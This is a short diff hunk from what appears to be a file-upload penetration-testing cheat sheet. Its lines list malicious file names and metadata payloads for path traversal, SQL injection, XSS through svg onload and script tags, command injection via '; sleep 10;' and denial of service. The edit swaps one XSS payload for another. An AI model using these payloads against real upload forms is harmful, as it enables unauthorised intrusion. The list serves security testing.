@@ -236,7 +236,7 @@ exiftool -Comment="\"><script>alert(prompt('XSS BY ZEROX4'))</script>" xss_comme
 File Name Vulnerability:
 Path Traversals: ../../../tmp/lol.png
 SQL Injection: sleep(10) — -.jpg
-XSS: <svg onload=alert(document.comain)>.jpg/png
+XSS: "><svg onload=alert(1)>.jpg
 Command Injection: ; sleep 10;.jpg
 DOS: Rename your file to a long string and upload, It may cause DOS.
 
